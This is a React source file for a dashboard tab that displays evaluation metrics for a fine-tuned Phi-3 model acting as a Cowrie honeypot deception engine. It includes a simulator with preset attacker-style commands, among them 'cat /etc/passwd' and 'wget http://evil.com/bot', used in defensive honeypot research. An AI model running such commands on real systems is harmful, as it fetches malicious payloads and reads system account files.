"use client";
import { useEffect, useState, useRef } from "react";
import {
  BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip,
  ResponsiveContainer, Cell,
} from "recharts";
import { AlertTriangle } from "lucide-react";
import { SAMPLE_GENERATIONS } from "@/lib/constants";

interface AEIResult {
  factor: number;
  sessions: number;
  aeiMean: number;
  aeiMedian: number;
  cmdIncrease: number;
  durIncrease: number;
}

interface LLMData {
  bertscoreF1: number | null;
  bertscorePrecision: number | null;
  bertscoreRecall: number | null;
  samples: number | null;
  hallucinationRate: number | null;
  fidelityRate: number | null;
  aeiMean: number | null;
  cmdIncreasePct: number | null;
  durIncreasePct: number | null;
  aeiResults: AEIResult[];
  perSampleF1: number[];
  model: string | null;
  lastUpdated: string;
}

function GaugeBar({ value, max = 1, label, color = "#22c55e", danger = false }: {
  value: number | null; max?: number; label: string; color?: string; danger?: boolean;
}) {
  if (value === null) return (
    <div style={{ marginBottom: 16 }}>
      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
        <span style={{ fontSize: 12, color: "var(--text-secondary)" }}>{label}</span>
        <span style={{ fontSize: 13, color: "var(--text-secondary)" }}>—</span>
      </div>
      <div style={{ height: 6, background: "var(--border)", borderRadius: 3 }} />
    </div>
  );
  const pct = (value / max) * 100;
  const c = danger ? (pct < 20 ? "#22c55e" : pct < 50 ? "#f59e0b" : "#ef4444") : color;
  return (
    <div style={{ marginBottom: 16 }}>
      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
        <span style={{ fontSize: 12, color: "var(--text-secondary)" }}>{label}</span>
        <span style={{ fontSize: 13, fontWeight: 700, color: c }}>
          {value < 1.5 ? (value * 100).toFixed(1) + "%" : value.toFixed(4)}
        </span>
      </div>
      <div style={{ height: 6, background: "var(--border)", borderRadius: 3 }}>
        <div style={{ height: "100%", width: `${Math.min(pct, 100)}%`, background: c, borderRadius: 3, transition: "width 0.5s ease" }} />
      </div>
    </div>
  );
}

const tooltipStyle = {
  contentStyle: { background: "var(--bg-card)", border: "1px solid var(--border)", borderRadius: 6 },
  labelStyle: { color: "var(--text-primary)", fontSize: 11 },
  itemStyle: { color: "var(--text-secondary)", fontSize: 11 },
};

export default function LLMTab() {
  const [data, setData] = useState<LLMData | null>(null);
  const [loading, setLoading] = useState(true);
  const [fetchError, setFetchError] = useState<string | null>(null);
  const [simCmd, setSimCmd] = useState("");
  const [simResult, setSimResult] = useState<{ command: string; response: string } | null>(null);
  const [simLoading, setSimLoading] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    fetch("/api/llm")
      .then(async r => {
        const json = await r.json();
        if (!r.ok) {
          setFetchError((json as { error?: string }).error ?? "Failed to load LLM results.");
        } else {
          setData(json as LLMData);
        }
      })
      .catch(err => setFetchError(String(err)))
      .finally(() => setLoading(false));
  }, []);

  const runSimulation = async (cmd?: string) => {
    const command = (cmd ?? simCmd).trim();
    if (!command) return;
    setSimLoading(true);
    const resp = await fetch(`/api/simulate?cmd=${encodeURIComponent(command)}`);
    setSimResult(await resp.json());
    setSimLoading(false);
  };

  if (loading) return (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "center", height: 400 }}>
      <div style={{ color: "var(--text-secondary)", fontSize: 14 }}>Loading LLM evaluation results...</div>
    </div>
  );

  const modelName = data?.model?.split("/").pop() ?? "Phi-3-mini-4k-instruct";

  return (
    <div className="fade-in">

      {/* Error banner */}
      {fetchError && (
        <div style={{ marginBottom: 20, padding: 16, background: "rgba(239,68,68,0.06)", border: "1px solid rgba(239,68,68,0.25)", borderRadius: 8 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
            <AlertTriangle size={16} color="#ef4444" />
            <span style={{ fontSize: 13, fontWeight: 600, color: "#ef4444" }}>LLM Results File Not Found</span>
          </div>
          <div style={{ fontSize: 12, color: "var(--text-secondary)", marginBottom: 6 }}>{fetchError}</div>
          <div style={{ fontSize: 11, color: "var(--text-secondary)" }}>
            Run <code style={{ color: "#fbbf24" }}>evaluate_phi3_cowrie.py</code> on Google Colab, then place{" "}
            <code style={{ color: "#fbbf24" }}>llm_evaluation_results.json</code> in the <code style={{ color: "#fbbf24" }}>llm/</code> folder and restart the dev server.
          </div>
        </div>
      )}

      {/* Metrics — only shown when data loaded */}
      {data && (
        <>
          {/* Header info */}
          <div style={{ marginBottom: 20, padding: 16, background: "rgba(59,130,246,0.06)", border: "1px solid rgba(59,130,246,0.15)", borderRadius: 8 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
              <div>
                <div style={{ fontSize: 13, color: "#60a5fa", fontWeight: 600, marginBottom: 4 }}>
                  {modelName} — QLoRA Fine-Tuned Cowrie Deception Engine
                </div>
                <div style={{ fontSize: 11, color: "var(--text-secondary)" }}>
                  3.8B params · 4-bit NF4 quantization · LoRA rank=16 α=32 · {data.samples ?? "—"} training samples · 5 epochs on Google Colab T4 · Evaluated with BERTScore (RoBERTa-large) + AEI
                </div>
              </div>
              <div style={{ fontSize: 10, color: "var(--text-secondary)", textAlign: "right", whiteSpace: "nowrap", marginLeft: 16, flexShrink: 0 }}>
                Results last updated<br />
                <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>
                  {new Date(data.lastUpdated).toLocaleString()}
                </span>
              </div>
            </div>
          </div>

          {/* KPI Row */}
          <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 16, marginBottom: 24 }}>
            {[
              {
                label: "BERTScore F1",
                value: data.bertscoreF1 != null ? (data.bertscoreF1 * 100).toFixed(1) + "%" : "—",
                sub: "Semantic similarity (RoBERTa)",
                color: "#22c55e",
              },
              {
                label: "Hallucination Rate",
                value: data.hallucinationRate != null ? data.hallucinationRate.toFixed(1) + "%" : "—",
                sub: "F1 < 0.45 OR AI phrase leakage",
                color: "#22c55e",
              },
              {
                label: "Fidelity Rate",
                value: data.fidelityRate != null ? data.fidelityRate.toFixed(1) + "%" : "—",
                sub: "F1 ≥ 0.75 (high-quality responses)",
                color: "#f59e0b",
              },
              {
                label: "AEI Mean (f=0.20)",
                value: data.aeiMean != null ? data.aeiMean.toFixed(2) : "—",
                sub: data.cmdIncreasePct != null && data.durIncreasePct != null
                  ? `+${data.cmdIncreasePct}% cmds · +${data.durIncreasePct}% duration`
                  : "—",
                color: "#a855f7",
              },
            ].map(({ label, value, sub, color }) => (
              <div key={label} className="card card-accent" style={{ padding: 18 }}>
                <div style={{ fontSize: 10, color: "var(--text-secondary)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 4 }}>{label}</div>
                <div style={{ fontSize: 26, fontWeight: 700, color, letterSpacing: "-0.02em" }}>{value}</div>
                <div style={{ fontSize: 10, color: "var(--text-secondary)", marginTop: 4 }}>{sub}</div>
              </div>
            ))}
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
            {/* BERTScore breakdown */}
            <div className="card" style={{ padding: 20 }}>
              <div style={{ fontSize: 11, color: "var(--text-secondary)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 16 }}>
                BERTScore Breakdown (n = {data.samples ?? "—"} samples)
              </div>
              <GaugeBar value={data.bertscorePrecision} label="Precision" color="#3b82f6" />
              <GaugeBar value={data.bertscoreRecall}    label="Recall"    color="#22c55e" />
              <GaugeBar value={data.bertscoreF1}        label="F1 Score"  color="#a855f7" />
              <GaugeBar
                value={data.hallucinationRate != null ? data.hallucinationRate / 100 : null}
                label="Hallucination Rate (lower = better)"
                danger
              />
              <GaugeBar
                value={data.fidelityRate != null ? data.fidelityRate / 100 : null}
                label="Fidelity Rate (F1 ≥ 0.75)"
                color="#f59e0b"
              />
              <div style={{ marginTop: 16, padding: 10, background: "rgba(34,197,94,0.06)", border: "1px solid rgba(34,197,94,0.15)", borderRadius: 6, fontSize: 11, color: "#4ade80" }}>
                {data.hallucinationRate === 0
                  ? "✓ 0% hallucination — no samples fell below the BERTScore 0.45 threshold. The model maintains contextually valid Linux terminal outputs."
                  : `⚠ ${data.hallucinationRate?.toFixed(1)}% hallucination rate detected across ${data.samples ?? "—"} samples.`}
              </div>
              <div style={{ marginTop: 8, padding: 10, background: "rgba(245,158,11,0.06)", border: "1px solid rgba(245,158,11,0.15)", borderRadius: 6, fontSize: 11, color: "#fbbf24" }}>
                ⚠ {data.fidelityRate?.toFixed(1)}% fidelity: Only{" "}
                {data.samples != null && data.fidelityRate != null ? Math.round(data.samples * data.fidelityRate / 100) : "—"}/{data.samples ?? "—"}{" "}
                outputs achieve F1 ≥ 0.75. The model often produces <em>valid but paraphrased</em> Linux responses, which BLEU/ROUGE would miscount as hallucinations.
              </div>
            </div>

            {/* AEI Sensitivity */}
            <div className="card" style={{ padding: 20 }}>
              <div style={{ fontSize: 11, color: "var(--text-secondary)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 16 }}>
                Attacker Engagement Index — Sensitivity Analysis
              </div>
              <ResponsiveContainer width="100%" height={180}>
                <BarChart data={data.aeiResults} barGap={2}>
                  <CartesianGrid strokeDasharray="3 3" stroke="var(--border)" />
                  <XAxis dataKey="factor" tickFormatter={v => `f=${v}`} tick={{ fontSize: 10, fill: "var(--text-secondary)" }} />
                  <YAxis tick={{ fontSize: 10, fill: "var(--text-secondary)" }} tickFormatter={v => `${v}%`} />
                  <Tooltip {...tooltipStyle} formatter={(v, name) => [`${Number(v).toFixed(2)}%`, name]} />
                  <Bar dataKey="cmdIncrease"  name="Cmd Increase %"      fill="#3b82f6" radius={[3, 3, 0, 0]} />
                  <Bar dataKey="durIncrease"  name="Duration Increase %"  fill="#a855f7" radius={[3, 3, 0, 0]} />
                </BarChart>
              </ResponsiveContainer>
              <div style={{ marginTop: 12, fontSize: 11, color: "var(--text-secondary)", lineHeight: 1.6 }}>
                At engagement factor 0.20, the model predicts{" "}
                <strong style={{ color: "#60a5fa" }}>+{data.cmdIncreasePct ?? "—"}% more commands</strong> and{" "}
                <strong style={{ color: "#c084fc" }}>+{data.durIncreasePct ?? "—"}% longer sessions</strong> across {data.aeiResults[0]?.sessions.toLocaleString() ?? "—"} Cowrie sessions.
                AEI formula: <code style={{ color: "#fbbf24", fontSize: 10 }}>Δcmds / Δduration</code> (mean: {data.aeiMean?.toFixed(4) ?? "—"}).
              </div>
              <div style={{ marginTop: 12, overflowX: "auto" }}>
                <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 10 }}>
                  <thead>
                    <tr style={{ borderBottom: "1px solid var(--border)" }}>
                      {["Factor", "Sessions", "AEI Mean", "AEI Median", "Cmd +%", "Dur +%"].map(h => (
                        <th key={h} style={{ padding: "4px 8px", textAlign: "right", color: "var(--text-secondary)", fontWeight: 600 }}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {data.aeiResults.map(r => (
                      <tr key={r.factor} style={{ borderBottom: "1px solid var(--border)" }}>
                        <td style={{ padding: "5px 8px", textAlign: "right", color: "#60a5fa", fontWeight: 600 }}>{r.factor}</td>
                        <td style={{ padding: "5px 8px", textAlign: "right", color: "var(--text-secondary)" }}>{r.sessions.toLocaleString()}</td>
                        <td style={{ padding: "5px 8px", textAlign: "right", color: "var(--text-primary)", fontWeight: 600 }}>{r.aeiMean.toFixed(4)}</td>
                        <td style={{ padding: "5px 8px", textAlign: "right", color: "var(--text-secondary)" }}>{r.aeiMedian.toFixed(4)}</td>
                        <td style={{ padding: "5px 8px", textAlign: "right", color: "#22c55e" }}>{r.cmdIncrease}%</td>
                        <td style={{ padding: "5px 8px", textAlign: "right", color: "#a855f7" }}>{r.durIncrease}%</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          {/* Per-sample F1 distribution */}
          {data.perSampleF1.length > 0 && (
            <div className="card" style={{ padding: 20, marginBottom: 16 }}>
              <div style={{ fontSize: 11, color: "var(--text-secondary)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 12 }}>
                BERTScore F1 Distribution ({data.perSampleF1.length} samples)
              </div>
              <ResponsiveContainer width="100%" height={120}>
                <BarChart data={data.perSampleF1.slice(0, 50).map((v, i) => ({ i, f1: v }))}>
                  <XAxis dataKey="i" hide />
                  <YAxis domain={[0.5, 1.0]} tick={{ fontSize: 9, fill: "var(--text-secondary)" }} width={35} />
                  <Tooltip {...tooltipStyle} formatter={(v) => Number(v).toFixed(4)} />
                  <Bar dataKey="f1" radius={[2, 2, 0, 0]}>
                    {data.perSampleF1.slice(0, 50).map((v, i) => (
                      <Cell key={i} fill={v >= 0.75 ? "#22c55e" : v >= 0.55 ? "#f59e0b" : "#ef4444"} />
                    ))}
                  </Bar>
                </BarChart>
              </ResponsiveContainer>
              <div style={{ display: "flex", gap: 16, marginTop: 8, fontSize: 10 }}>
                <span style={{ color: "#22c55e" }}>■ F1 ≥ 0.75 (high fidelity)</span>
                <span style={{ color: "#f59e0b" }}>■ 0.55–0.75 (moderate)</span>
                <span style={{ color: "#ef4444" }}>■ &lt;0.55 (low)</span>
              </div>
            </div>
          )}
        </>
      )}

      {/* Sample generations — always visible, static (not in evaluation JSON) */}
      <div className="card" style={{ padding: 20, marginBottom: 16 }}>
        <div style={{ fontSize: 11, color: "var(--text-secondary)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 16 }}>
          Sample Generations vs Ground Truth
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {SAMPLE_GENERATIONS.map((s, i) => (
            <div key={i} style={{ padding: 12, background: "var(--bg-primary)", borderRadius: 6, border: "1px solid var(--border)" }}>
              <div style={{ fontFamily: "monospace", fontSize: 12, marginBottom: 8 }}>
                <span style={{ color: "#f59e0b" }}>$ </span>
                <span style={{ color: "#e2e8f0" }}>{s.attacker}</span>
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                <div style={{ padding: 8, background: "rgba(59,130,246,0.08)", borderRadius: 4, border: "1px solid rgba(59,130,246,0.2)" }}>
                  <div style={{ fontSize: 9, color: "#60a5fa", marginBottom: 4, fontWeight: 600 }}>COWRIE DEFAULT</div>
                  <pre style={{ fontFamily: "monospace", fontSize: 10, color: "#94a3b8", margin: 0, whiteSpace: "pre-wrap" }}>{s.cowrie}</pre>
                </div>
                <div style={{ padding: 8, background: "rgba(168,85,247,0.08)", borderRadius: 4, border: "1px solid rgba(168,85,247,0.2)" }}>
                  <div style={{ fontSize: 9, color: "#c084fc", marginBottom: 4, fontWeight: 600 }}>PHI-3 DECEPTION</div>
                  <pre style={{ fontFamily: "monospace", fontSize: 10, color: "#e2e8f0", margin: 0, whiteSpace: "pre-wrap" }}>{s.phi3}</pre>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Improvements section */}
        <div style={{ marginTop: 20, borderTop: "1px solid var(--border)", paddingTop: 16 }}>
          <div style={{ fontSize: 11, color: "var(--text-secondary)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 12 }}>
            Identified Improvement Opportunities
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
            {[
              { title: "Expand Training Dataset", desc: "365 samples is small for 3.8B model. Target 2,000–5,000 pairs via more TTY logs and command variations.", color: "#ef4444", priority: "Critical" },
              { title: "Multi-Turn Session Context", desc: "Train with 2–3 previous commands in context so model maintains state within a session.", color: "#f59e0b", priority: "High" },
              { title: "System Prompt Enrichment", desc: "Add hostname, kernel version, installed packages to the system prompt for cross-session consistency.", color: "#f59e0b", priority: "High" },
              { title: "Expert Hallucination Review", desc: "Manual review of 'hallucinated' samples — many are valid Linux responses that ROUGE/BERTScore underscores.", color: "#3b82f6", priority: "Medium" },
              { title: "Response Caching Layer", desc: "Cache frequent commands (uname, id, whoami) to reduce GPU inference latency in live Cowrie deployment.", color: "#3b82f6", priority: "Medium" },
              { title: "Live Cowrie Integration", desc: "Implement command router in Cowrie Python code — unknown commands forwarded to LLM gateway with output filter.", color: "#22c55e", priority: "Future" },
            ].map(item => (
              <div key={item.title} style={{ padding: 12, background: `${item.color}08`, border: `1px solid ${item.color}25`, borderRadius: 6 }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
                  <span style={{ fontSize: 12, fontWeight: 600, color: "var(--text-primary)" }}>{item.title}</span>
                  <span style={{ fontSize: 10, padding: "1px 6px", borderRadius: 3, background: `${item.color}20`, color: item.color }}>{item.priority}</span>
                </div>
                <div style={{ fontSize: 11, color: "var(--text-secondary)", lineHeight: 1.5 }}>{item.desc}</div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Cowrie Response Simulator */}
      <div className="card" style={{ padding: 20, marginTop: 16 }}>
        <div style={{ fontSize: 11, color: "var(--text-secondary)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 16 }}>
          Cowrie Terminal Simulator — type any command to see the honeypot response
        </div>
        <div style={{ display: "flex", gap: 8, marginBottom: 16 }}>
          <div style={{ flex: 1, display: "flex", alignItems: "center", background: "#0f172a", border: "1px solid var(--border)", borderRadius: 6, padding: "0 12px", fontFamily: "monospace" }}>
            <span style={{ color: "#22c55e", marginRight: 8, fontSize: 13 }}>root@svr04:~#</span>
            <input
              ref={inputRef}
              value={simCmd}
              onChange={e => setSimCmd(e.target.value)}
              onKeyDown={e => e.key === "Enter" && runSimulation()}
              placeholder="whoami"
              style={{ flex: 1, background: "transparent", border: "none", outline: "none", color: "#e2e8f0", fontSize: 13, fontFamily: "monospace", padding: "10px 0" }}
            />
          </div>
          <button
            onClick={() => runSimulation()}
            disabled={simLoading}
            style={{ padding: "0 20px", background: "rgba(34,197,94,0.12)", border: "1px solid rgba(34,197,94,0.3)", borderRadius: 6, color: "#22c55e", fontSize: 13, cursor: "pointer", fontWeight: 600, whiteSpace: "nowrap" }}
          >
            {simLoading ? "Running..." : "Run"}
          </button>
        </div>
        <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginBottom: 16 }}>
          {["whoami", "uname -a", "id", "ls -la", "cat /etc/passwd", "ps -ef", "ifconfig", "wget http://evil.com/bot"].map(cmd => (
            <button key={cmd} onClick={() => { setSimCmd(cmd); runSimulation(cmd); }} style={{ padding: "3px 10px", background: "var(--bg-card-hover)", border: "1px solid var(--border)", borderRadius: 4, color: "var(--text-secondary)", fontSize: 11, cursor: "pointer", fontFamily: "monospace" }}>
              {cmd}
            </button>
          ))}
        </div>
        {simResult && (
          <div style={{ background: "#0a0f1a", border: "1px solid var(--border)", borderRadius: 6, padding: 16, fontFamily: "monospace", fontSize: 12 }}>
            <div style={{ color: "#22c55e", marginBottom: 6 }}>root@svr04:~# {simResult.command}</div>
            <pre style={{ color: "#e2e8f0", margin: 0, whiteSpace: "pre-wrap", lineHeight: 1.6 }}>
              {simResult.response || <span style={{ color: "var(--text-secondary)" }}>(no output)</span>}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
}
